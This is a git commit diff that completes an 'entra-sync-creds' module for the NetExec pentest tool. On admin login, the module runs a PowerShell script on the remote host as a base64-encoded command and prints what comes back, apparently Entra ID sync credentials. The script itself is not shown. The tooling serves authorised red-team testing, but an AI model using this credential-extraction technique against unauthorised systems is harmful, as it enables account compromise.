ce157470a1050e65aa273fc62ae05e8f5a679cb5
Alexander Neff <alex99.neff@gmx.de>
2025-06-29 19:38:35 -0400

    Finish entry-sync-creds module

--- nxc/modules/entra-sync-creds.py
+++ nxc/modules/entra-sync-creds.py
@@ -1,9 +1,13 @@
 
+from base64 import b64encode
+from nxc.helpers.powershell import get_ps_script
+
+
 class NXCModule:
     """
     Example:
     -------
-    Module by @yomama
+    Module by @NeffIsBack
     """
 
     name = "entra-sync-creds"
@@ -16,10 +20,31 @@ class NXCModule:
         self.context = None
         self.module_options = None
 
+        self.entra_id_psscript = ""
+
+        with open(get_ps_script("entra-sync-creds/entra-sync-creds.ps1")) as psFile:
+            for line in psFile:
+                if line.startswith("#") or line.strip() == "":
+                    continue
+                else:
+                    self.entra_id_psscript += line.strip() + "\n"
+
     def options(self, context, module_options):
-        """Required.
-        Module options get parsed here. Additionally, put the modules usage here as well
-        """
+        """No module options available."""
 
     def on_admin_login(self, context, connection):
         self.context = context
+
+        psScript_b64 = b64encode(self.entra_id_psscript.encode("UTF-16LE")).decode("utf-8")
+        out = connection.execute(f"powershell.exe -e {psScript_b64} -OutputFormat Text", True)
+
+        if "CLIXML" in out:
+            out = out.split("CLIXML")[1].split("<Objs Version")[0]
+
+        for line in out.splitlines():
+            if not line.strip():
+                continue
+            if "[!]" in line:
+                self.context.log.fail(line.replace("[!]", "").strip())
+            else:
+                self.context.log.highlight(line.strip())
